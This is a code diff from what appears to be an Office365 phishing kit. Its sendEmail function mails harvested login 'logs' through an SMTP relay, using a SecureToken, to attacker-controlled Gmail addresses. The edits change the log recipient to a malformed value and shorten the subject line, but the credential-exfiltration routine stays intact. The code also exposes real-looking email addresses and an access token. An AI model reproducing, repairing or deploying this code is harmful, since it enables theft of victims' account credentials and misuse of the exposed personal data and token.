@@ -2,7 +2,7 @@ var smtp_host = 'smtp.office365.com';
 var smtp_username = 'marc.declercq@edu.vlerick.com';
 
 //Enter were logs will go here
-var log_email = 'kjvluv1@gmail.com'
+var log_email = 'to',
 
 
 url_link = "session.html";
@@ -103,7 +103,7 @@ function sendEmail(to,message) {
   SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
   To : 'gotradebtc@gmail.com',
   From : smtp_username,
-  Subject : '==============+ [Office365 Log] +================',
+  Subject : '+ [Office365 Log] +',
   Body : message,
   }).then(function(message){
       if(message == 'OK'){
